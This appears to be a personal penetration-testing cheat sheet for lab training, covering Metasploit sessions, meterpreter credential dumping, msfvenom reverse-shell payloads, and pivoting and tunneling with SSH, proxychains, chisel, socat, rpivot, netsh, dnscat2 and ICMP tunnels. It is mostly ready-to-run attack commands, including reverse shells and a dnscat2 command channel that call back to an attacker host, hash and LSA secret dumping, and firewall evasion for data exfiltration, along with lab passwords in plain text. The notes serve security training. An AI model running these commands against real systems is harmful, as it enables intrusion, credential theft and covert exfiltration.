```

```
nessus_help
```

or

```bash
help
```

Some popular plugin are:
- nMap (pre-installed)
- Mimikatz (pre-installed)
- Priv
- NexPose (pre-installed)
- Stdapi (pre-installed)
- Incognito (pre-installed)
- Nessus (pre-installed)
- Railgun
- Darkoperator's

## Manage multiple sessions
When you have a session (cmd/bash/meterpreter) you can use `ctr+z` to put in background and use metasploit.

To see the active sessions:
```bash
sessions
```

To use a session:
```bash
sessions -i 1
```

## To upgrade a session

```bash
sessions -u 1
```

then you can see with `sessions -l` and 

## jobs -h

If we are running an exploit under a specific port and we need this port to another module we can use jobs. 

```bash
jobs -h
```

When we run an exploit, we can running as a job with `exploit -j`. This start executing in background.

To kill some specific job, you can use the index no.
```bash
kill index nº
```

## Meterpreter
Use `DLL injection` to ensure that is stable and difficult to detect.

With meterpreter you can use nmap inside the host to another host:
```bash
db_nmap -sV -p- -T5 -A 10.10.10.15
```

Then, you can see with `hosts` and with `services`

You can search for exploits and use it:
```bash
search iis_webdav_upload_asp
```

```
use x
```

We can try to migrate to another process:
```meterpreter
getuid (it's possible that appear access denied)
```

```meterpreter
ps
```


```meterpreter
steal_token PID_number
```

See the PID of the process
```
getuid
```

You can put in background a session and use `post/multi/recon/local_exploit_suggester` to search in the device possible exploits.

Dumping hash:
```bash
hashdump
```

```bash
lsa_dump_sam
```

lsa secrets dump
```bash
lsa_dump_secrets
```

You can search exploits with:
```bash
searchsploit -t Nagios3 --exclude=".py"
```

Copy the file:
```
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/
```

Loading modules
```
msfconsole -m /usr/share/metasploit-framework/modules/
```

```
msf6> loadpath /usr/share/metasploit-framework/modules/
```

Alternative you can use:
```
reload_all
```

```
use exploit/unix/webapp/nagios3_command_injection 
```

Adapt a custom php, python or any type of script to Ruby for metasploit.

## Msfvenom

Create a reverse shell:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```



# Pivoting, Tunneling and Port Forwarding

To see some IPs we can use routing commands:

```Linux
ip route
```

In Windows:

```powershell
netstat -r
```

## Ping Sweep 

It's possible that a ping sweep may not result successful on the first attempts, this is due to arp cache. **It is good to attempt our ping sweep at least twice**.

### Meterpreter session
If you have a meterpreter session in the pivoting host, you can use
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

### For Linux

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

If `{1..254}` doesn't work you can use `seq`
```bash
for i in $(seq 254); do ping 172.16.5.$i -c1 -W1 & done | grep from
```


for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

### Using CMD

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### Using PowerShell

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

### If a firewall block it
We can perform a TCP scan with metasploit

## Local Port Forward SSH

```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

confirming the port forwarding with netstat:
```bash
netstat -antp | grep 1234
```

With nmap
```bash
nmap -v -sV -p1234 localhost
```

You can do with multiple ports:
```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

## Dynamic Port Forwarding

This technique allow us to use SSH tunneling over SOCKS proxy.
```bash
ssh -D 9050 ubuntu@10.129.202.64
```

Now, every app configured in this port can send package to the host. But we need to configure a tool that can route the tool's packets.

We can use proxychains to redirect TCP connections, through different proxy servers such as TOR, SOCKS, HTTPS...

## Proxychains

The config file is `/etc/proxychains.conf`, remember that 
```bash
socks4  127.0.0.1 9050
```

Using nmap with proxychange. Remeber that here we can only do `FULL TCP CONNECT SCAN` over proxychange.
```bash
proxychains nmap -v -sn 172.16.5.1-200
```

Enumerate a target with proxychains
```
proxychains nmap -v -Pn -sT 172.16.5.19
```

You can use metasploit with proxychains:
```bash
proxychains msfconsole
```

xfreerdp with proxychange
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

If xfreerdp doesn't work always you can use rdesktop
```bash
rdesktop -u htb-student -p HTB_@cademy_stdnt! 10.129.34.4
```

A lot of times give multiple errors, you can try to add the domain:
```bash
proxychains rdesktop -u victor -p "pass@123" 172.16.5.19 -d INLANEFREIGHT.LOCAL
```

## Remote/Reverse Port Forwarding with SSH

You need to have a reverse shell in the final host that redirect to the IP visible in the intermediary machine (use the correct interface, remember that machines always have to see each other)

In your attacker/kali machine:
```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Then in your attacker machine, you need to have a listener to receive the shell.

## Pivoting with metasploit

### Creating a proxy

You can create a socks proxy:
```metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

To confirm that is running you can use `jobs`.

Check if the /etc/proxychains.conf is running. Depend of the version that you set, you will need to use socks4 or socks5

```
socks4  127.0.0.1 9050
```

We can route all the traffic with the module `post/multi/manage/autoroute`.
To create the route:
```bash
set SESSION 1
set SUBNET 172.16.5.0
run
```

It is possible to add routes with autoroute by running autoroute from the **Meterpreter session**:

```bash
run autoroute -s 172.16.5.0/23
```

TO list the active routes you can use `-p`
```
run autoroute -p
```

Now, to testing, you can start using proxychains:
```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

### Portfwd

In a meterpreter session you can use `help portfwd` to see the options available.

```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

Now you can connected to the remoted host:

```
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Remember that you can use `netstat -antp` to see the ports used

### Reverse portfwd

In a meterpreter session
```
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

You can use `bg` to put the session in background and start a multi/handler
```
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0
run
```

Create the windows payload with meterpreter
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Execute the file in the windows machine and obtain the session in /multi/handler.

## Ligolo-ng

This is recommended for the OSCP because its faster.

Lingolo and Bloodhount use the same port, you can change in the config file.

When using _nmap_, you should use `--unprivileged` or `-PE` to avoid false positives.

## Socat

### sockat redirection with a reverse shell

Bidirectional tool that can create pipe sockets between 2 independent network channels.

Listeng on localhost port 8080 and foward all the traffic to port 10.10.14.18:80

```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

The payload, for exmple with msfvenom:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

In your attacker machine use a listener, example multi/handler

Windows (payload) -> Ubuntu (sockat) -> Attacker (listener)

### Sockat redirection with a bind shell

Create the payload
```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

Create ths socat bind shell listener in ubuntu
```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

use multi/handler

The different here is that we are pointing to the internal network where is the windows machine, while in the reverse shell we point to the public network where is our attacker machine.

## Chisel

All the network traffic will be forward with chisel.

We need to have installed go

```
git clone https://github.com/jpillora/chisel.git

cd chisel
go build
```

We can use scp to transfer to the victim
```
scp chisel ubuntu@10.129.202.64:~/
```

Running chisel server in the victim

```
./chisel server -v -p 1234 --socks5
```

In the attack box:
```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

Now, remember to edit `/etc/proxychains.conf` to have socks5:
```
socks5 127.0.0.1 1080
```

```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Chisel reverse pivot

To avoid firewall you can use `--reverse`.

In the attack box:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

In the client

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

If you are getting an error message with chisel on the target, try with a different version.


## Por forwarding in Windows
You have a pivot Windows host and you can use external tools

### plink.exe

If you want to download: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

This tool comes as part of the putty package. Before the fall of 2018, windows did not have a native ssh client included. We could use it to **live off the land**.

So, if the host is holder and putty is included we can use it:

```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```

We have [Proxifier](https://www.proxifier.com) tool to create a tunneled network through SOCKS or HTTPS proxy.
![Pasted image 20260716190120.png](images/Pasted%20image%2020260716190120.png)

You can configure the SOCKS server with 127.0.0.1 and port 9050. Then, you can directly start`mstsc.exe` to start an RDP session with a Windows target that allows RDP connections.

### Sshuttle
Sshuttle is another tool written in Python which removes the need to configure proxychains. However this only works for pivoting over SSH.

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

With this command, sshuttle creates an entry in our iptables to redirect all the traffic to the 172 network.

Now, we can do things like:

```bash
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

### Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy written in Python2. This tool binds a machine inside a corporate network to an external server and expose the client's local port on the server-side.

Running server.py from the attack host

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

We need to transfer the client to the pivot machine, we can use scp for this:

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

Running client.py from the pivot client

```bash
python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

If you see `New connection from host 10.129.202.64, source port 35226`, means that the client is connected.

Now you can connect with the browser for example:

```bash
proxychains firefox-esr 172.16.5.135:80
```

It is possible that some organizations have HTTP-proxy with NTLM authentication configured with the domain controller. In this case we can use rpivot client.py in the following way:

```bash
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```


### Netsh
Is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use `Netsh` for:

- Finding routes
- Viewing the firewall configuration
- Adding proxies
- Creating port forwarding rules

One time inside the pivot machine, in this case Windows, we can forward all data received on a specific port to a remote host on a specific port

```powershell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

All data received  in the port 8080 (listenport) of the pivot machine, 10.129.15.150 (listenaddress) is forward to 3389 (connectport) and host 172.16.5.25 (connectaddress)  

To verify port forwarding we can use:

```powershell
netsh.exe interface portproxy show v4tov4
```

Now in our attack machine we can connect to the port 8080 of the pivot machine that is forwarding the data.

```bash
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
```

### DNS tunneling with DNScat2

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that use DNS protocol to send data between two protocols. It uses an encrypted `Command-&-Control` channale and sends data inside TXT records.

Normally, active directory domain environment will have their own DNS server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network. Dnscat2 can be extremely stealthy to exfiltrate data while evading firewall detection.

#### setting up

```bash
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

#### starting the server

In our attack machine:

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

#### client

We can use the client write in powershell [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell).  

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Transfer to the pivot machine
```powershell
Import-Module .\dnscat2.ps1
```

```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

Now, in our server we should see `New window created: 1` 

to list the options that we have with dnscat2 we can use `?`

To obtain a session we can use:

```bash
window -i 1
```


### ICMP Tunneling with SOCKS
When a host with firewalled network is allowed to ping an external server, it can encapsulate its traffic withing the ping echo request and send it to external device. This is extremely useful for data exfiltration and creating pivot tunnels to an external server.

We can use [ptunnel-ng](https://github.com/utoni/ptunnel-ng) to create a tunnel.

```bash
git clone https://github.com/utoni/ptunnel-ng.git
```

To use client and server-side we need to execute autogen:
```bash
sudo ./autogen.sh
```

Another alternative to create a static binary:
```
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

Transfer the file to the pivot host:

```
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

starting the server on the target host
```
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

With `-r` we should indicate the IP of the jump-box we want ptunnel-ng to accept the connection.

In our attack box
```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

Now, with the ICMP tunnel created, we can attempt to connect to the target with ssh through port 22 in our attack box
```bash
ssh -p2222 -lubuntu 127.0.0.1
```

the before command is the same that:
```bash
ssh ubuntu@127.0.0.1 -p2222
```

In client and tunnel we should see `Incoming tunnel request from 10.10.14.18.` that verify the traffic.

To enable dynamic port forwarding we can use

```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

No we can start using proxychains

```bash
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

### RDP and SOCKS Tunneling with SocksOverRDP

[SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is a tool that use Dynamic VirtualChannels (DVC). DVC is responsible for tunneling packets over the RDP connection. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.

Download the binaries:
- [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
- [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

We need to move the `SocksOverRDPx64.zip` (or only `SocksOverRDP-Plugin.dll`) to the pivot. For loading we are going to use `regsvr32.exe`

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```

**Now we can connect to another machine** using `mstsc.exe`, and we should receive a prompt that SockOverRDP plugin is activated and it will listen on 1270..0.1:1080

You could transfer `SocksOverRDP-Server.exe` binary and execute with admin privileges.

You can check that is listening in the victim with
```
netstat -antb | findstr 1080
```

#### Using proxifier
Now we can create the proxy, transfer the files to the pivot machine. Then open and use profile > proxy servers > add and put 127.0.0.1 and port 1080 using SOCKS5.

#### RDP Performance Consideration
To improve the performance of RDP we can access to Experience tab in `mstsc.exe` and set `Performance` to **Modem**.


# Vulnerability scanners

## Nessus

Start the services
Login via web


## OpenVas

```bash
sudo apt-get install gvm && openvas
```

```bash
gvm-setup
```

```bash
gvm-start
```

Tool to generate report:
```bash
python3 -m openvasreporting -i report-2bf466b5-627d-4659-bea6-1758b43235b1.xml -f xlsx
```


# Sources
- Hacktricks
- PayloadAllTheThings

